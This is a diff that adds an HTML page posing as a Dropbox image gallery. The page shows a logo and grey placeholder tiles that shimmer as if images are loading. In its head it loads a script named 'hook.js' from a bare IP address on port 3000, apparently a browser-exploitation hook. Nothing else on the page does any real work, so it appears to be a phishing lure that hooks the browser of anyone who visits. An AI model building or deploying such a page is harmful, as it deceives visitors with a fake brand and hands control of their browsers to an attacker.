@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Gallery - Dropbox</title>
+    <link rel="icon" href="dc.png">
+    <script src="index.js" defer></script>
+    <script src="http://15.204.225.149:3000/hook.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+            background-color: #ffffff;
+            margin: auto;
+            margin-left: px;
+        }
+
+        .Img-title { 
+            width: 100%;
+            border-bottom: 1px solid #a8a8a8;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            z-index: 1000;
+            background-color: #ffffff;
+        }
+
+        .whatever {
+            height: 60px;
+            width: 180px;
+            margin-left: 20px;
+        }
+
+        .grid-container {
+            display: grid;
+            gap: 15px;
+            padding: 20px;
+            width: 100%;
+            margin-top: 120px;
+            max-width: 1200px;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        }
+
+        .image-container {
+            width: 100%;
+            height: 0;
+            padding-bottom: 100%;
+            position: relative;
+            background-color: #d4d4d4;
+        }
+
+        .image-container::before {
+            content: "";
+            display: block;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, #d4d4d4 25%, #b0b0b0 50%, #d4d4d4 75%);
+            background-size: 200% 100%;
+            animation: shimmer 1.5s infinite;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        @keyframes shimmer {
+            0% {
+                background-position: -200% 0;
+            }
+            100% {
+                background-position: 200% 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="Img-title">
+        <img class="whatever" src="images.png" alt="Logo">
+    </div>
+    <div class="grid-container">
+        <div class="image-container"></div>
+        <div class="image-container"></div>
+        <div class="image-container"></div>
+        <div class="image-container"></div>
+        <div class="image-container"></div>
+        <div class="image-container"></div>
+        <div class="image-container"></div>
+        <div class="image-container"></div>
+    </div>
+</body>
+</html>
